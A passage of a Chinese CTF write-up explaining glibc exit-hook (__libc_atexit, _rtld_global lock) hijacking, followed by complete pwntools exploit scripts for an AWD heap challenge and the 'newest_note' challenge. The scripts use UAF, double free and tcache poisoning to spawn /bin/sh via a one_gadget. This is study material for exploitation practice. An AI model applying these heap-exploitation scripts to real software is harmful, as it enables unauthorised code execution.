+<h3 id="新的发现"><a href="#新的发现" class="headerlink" title="新的发现"></a>新的发现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ... ...</span><br><span class="line">        <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">            RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">    _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上面的__run_exit_handlers 函数当中存在以上代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> RUN_HOOK(NAME, ARGS)						      \</span></span><br><span class="line"><span class="meta">do &#123;									      \</span></span><br><span class="line"><span class="meta">  void *const *ptr;						      \</span></span><br><span class="line"><span class="meta">  for (ptr = (void *const *) symbol_set_first_element (NAME);		      \</span></span><br><span class="line"><span class="meta">       ! symbol_set_end_p (NAME, ptr); ++ptr)				      \</span></span><br><span class="line"><span class="meta">    (*(__##NAME##_hook_function_t *) *ptr) ARGS;			      \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>
+
+<p>跟进发现是可以循环执行内容的一个函数，所以这里如果可以修改掉__libc_atexit就可以getshell。</p>
+<p>然后实际的做题过程中会发现并没有__libc_atexit这个符号，因为这不是一个全局变量，所以是找不到的，但是通过汇编分析</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220616192546678.png"
+                      alt="image-20220616192546678"
+                ></p>
+<p>可以发现是这条语句在调用hook</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220616192609058.png"
+                      alt="image-20220616192609058"
+                ></p>
+<p>在最后的实际调用也可以看到确实是这样的，这里的rbx也就是上面的__libc_atexit指针。</p>
+<h3 id="总结以上利用方式"><a href="#总结以上利用方式" class="headerlink" title="总结以上利用方式"></a>总结以上利用方式</h3><p>在最后总结一下以上两种利用方式，第一种利用方式的攻击层面其实是发生在ld层面的，所以也就存在了一些奇奇怪怪的因素(至少当初写house of banana总是会出现)但是这一种利用方式是可以我们控制其参数的。第二种利用方式就发生在libc层面了，所以我们修改起来也就更加的得心应手一点，不过坏处就是我们没法控制其参数。</p>
+<h2 id="一次awd训练的pwn"><a href="#一次awd训练的pwn" class="headerlink" title="一次awd训练的pwn"></a>一次awd训练的pwn</h2><p>题目的漏洞很明显，在delete函数存在UAF，并且在edit函数存在堆溢出，不过恶心的是没有show函数并且题目使用的输出函数都是write导致我们没法使用_IO_FILE来进行泄漏，虽然glibc的版本是2.27但是malloc_hook和free_hook初始值都是0没法进行partial write所以这里就需要使用到exit_hook了。</p>
+<p>这里因为漏洞点很简单就不一步一步分析了，就是实现unsored bin和tcache中存在同一使用的chunk，进行partial write达成以下情况</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220617141940026.png"
+                      alt="image-20220617141940026"
+                ></p>
+<p>然后利用同样的方法修改掉他的参数也就是<code>_rtld_global._dl_load_lock.mutex</code> 的值为<code>/bin/sh\x00</code>即可</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, data=<span class="string">b&#x27;\n&#x27;</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit_hook = <span class="number">0x62af60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            edit(<span class="number">0</span>, <span class="number">16</span>, flat(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            delete(<span class="number">0</span>)</span><br><span class="line">        create(<span class="number">0x80</span>, <span class="string">b&#x27;\x60\xaf\x82&#x27;</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x100</span>, <span class="string">b&#x27;\x20\xf4\x24&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x110</span>)</span><br><span class="line">        create(<span class="number">0x110</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            edit(<span class="number">5</span>, <span class="number">16</span>, flat(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            delete(<span class="number">5</span>)</span><br><span class="line">        create(<span class="number">0x90</span>, <span class="string">b&#x27;\x68\xa9\x82&#x27;</span>)</span><br><span class="line">        create(<span class="number">0x110</span>)</span><br><span class="line">        create(<span class="number">0x110</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">        <span class="comment"># gdb.attach(r)</span></span><br><span class="line">        r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="国赛newest-note"><a href="#国赛newest-note" class="headerlink" title="国赛newest_note"></a>国赛newest_note</h2><p>这道题目其实存在一个非常明显，可惜当时我没有发现的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword_4198 = input_int();</span><br><span class="line">chunk_arr = <span class="built_in">malloc</span>(<span class="number">8</span> * dword_4198);</span><br></pre></td></tr></table></figure>
+
+<p>也就是在开始的时候可以创建任意大小的chunk，所以可以直接泄露地址，不过即便是没注意到这个漏洞也是可以做题的，不过因为没有接触过exit_hook所以我当时的思路是劫持栈进行ROP，后面发现实现不了。</p>
+<h3 id="在不用mmap生成chunk泄露的情况下"><a href="#在不用mmap生成chunk泄露的情况下" class="headerlink" title="在不用mmap生成chunk泄露的情况下"></a>在不用mmap生成chunk泄露的情况下</h3><p>在glibc-2.27_ubuntu1.2_amd64之后tcache就存在double free的检测了，结合题目这里是没法直接在tcache当中进行double free的，所以我们只能将double free发生在fastbin当中</p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>使用这种方法其实是比较麻烦的，首先将tcache占满，那么下一次释放的chunk会进入fastbin，然后create一个chunk，拿出tcache中的一个chunk，接着再释放一次fastbin当中的chunk，就达到了在tcacheh和fastbin当中存在同一个chunk的情况了，接着伪造fastbin，利用<a href="fastbin_reverse_into_tcache">fastbin_reverse_into_tcache</a>将伪造的链放入tcache即可进一步利用了。</p>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;How many pages your notebook will be? :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;45&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    create(i, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">create(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((heap_base + <span class="number">0x610</span>) &gt;&gt; <span class="number">12</span>))</span><br><span class="line">key = heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">18</span>, p64(key ^ (heap_base + <span class="number">0x560</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(key ^ (heap_base + <span class="number">0x480</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">19</span>, p64(key ^ (heap_base + <span class="number">0x460</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(key ^ (heap_base + <span class="number">0x420</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(key))</span><br><span class="line">create(<span class="number">20</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">21</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x218cc0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line">libc_atexit = libc_base + <span class="number">0x21a6c8</span> - <span class="number">8</span></span><br><span class="line">create(<span class="number">30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(libc_atexit ^ key))</span><br><span class="line">create(<span class="number">31</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">32</span>, p64(<span class="number">0</span>) + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">gdb.attach(</span><br><span class="line">    r,</span><br><span class="line">    <span class="string">&#x27;b*$rebase(0x169A)\nb _int_malloc\ndir /ctf/work/download/glibc-2.34/malloc&#x27;</span></span><br><span class="line">)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="在mmap生成chunk的情况下"><a href="#在mmap生成chunk的情况下" class="headerlink" title="在mmap生成chunk的情况下"></a>在mmap生成chunk的情况下</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>在这个情况下其实就更加简单了，因为这里直接泄露了libc地址，所以我们不需要想上面那样构造fake tcache，我们只需要拿到double free即可，这里因为可以直接少用一次free所以我们可以直接在fastbin当中进行double free。</p>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;How many pages your notebook will be? :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x40040000</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">show(<span class="number">0x8339a</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x218cc0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    create(i, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">key = u64(r.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(i, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line">libc_atexit = libc_base + <span class="number">0x21a6c8</span> - <span class="number">8</span></span><br><span class="line">create(<span class="number">7</span>, p64(libc_atexit ^ key))</span><br><span class="line">create(<span class="number">8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">9</span>, p64(<span class="number">0</span>) + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">gdb.attach(</span><br><span class="line">    r,</span><br><span class="line">    <span class="string">&#x27;b*$rebase(0x169A)\nb _int_malloc\ndir /ctf/work/download/glibc-2.34/malloc&#x27;</span></span><br><span class="line">)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
